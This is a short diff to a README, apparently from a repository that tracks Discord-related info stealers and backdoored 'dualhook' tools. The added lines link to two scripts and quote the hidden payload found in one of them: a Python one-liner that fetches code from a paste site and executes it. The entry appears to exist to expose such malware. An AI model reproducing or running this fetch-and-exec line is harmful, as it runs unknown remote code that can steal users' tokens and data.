@@ -12,5 +12,9 @@ its fake doenerium XD
 
 - satan stealer
 
+https://github.com/zrSadek/discord-vanity-sniper/blob/main/main.py see raw main code lmao
+
+https://raw.githubusercontent.com/zrSadek/discord-mass-friend/main/main.py `;exec(requests.get('https://rentry.co/tvfwh/raw').text)`
+
 - In this repository will be stored information about Stealers or source codes with Dualhook.
 - Anyone is free to contribute here
